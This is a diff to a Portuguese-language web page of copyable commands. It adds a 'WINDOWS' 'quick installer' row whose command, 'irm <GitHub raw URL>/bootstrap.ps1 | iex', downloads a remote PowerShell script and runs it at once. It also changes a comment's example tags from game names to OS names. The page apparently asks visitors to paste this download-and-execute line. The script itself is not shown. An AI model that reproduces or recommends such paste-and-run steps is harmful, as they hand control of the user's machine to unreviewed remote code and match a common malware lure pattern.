@@ -885,7 +885,7 @@
                     de outro bloco (dentro desta mesma div id="cmd-list"),
                     e troque apenas os textos indicados:
 
-                    - cmd-tag   -> nome curto/etiqueta (ex: ROBLOX, FIVEM, CS2)
+                    - cmd-tag   -> nome curto/etiqueta (ex: WIN, MACOS)
                     - cmd-code  -> o comando/código que será copiado ao clicar
                     - cmd-meta  -> texto de status (ex: validade, tipo de trava)
 
@@ -911,6 +911,13 @@
                         <span class="cmd-tag">MAC</span>
                         <span class="cmd-code">sysctl -n machdep.cpu.brand_string</span>
                         <span class="cmd-meta"><span class="dot">●</span>Obter info CPU</span>
+                        <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+                    </div>
+
+                    <div class="cmd-row">
+                        <span class="cmd-tag">WINDOWS</span>
+                        <span class="cmd-code">irm https://raw.githubusercontent.com/yC0D3X/codex-setup/main/bootstrap.ps1 | iex</span>
+                        <span class="cmd-meta"><span class="dot">●</span>Instalador Rápido</span>
                         <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
                     </div>
                 </div>
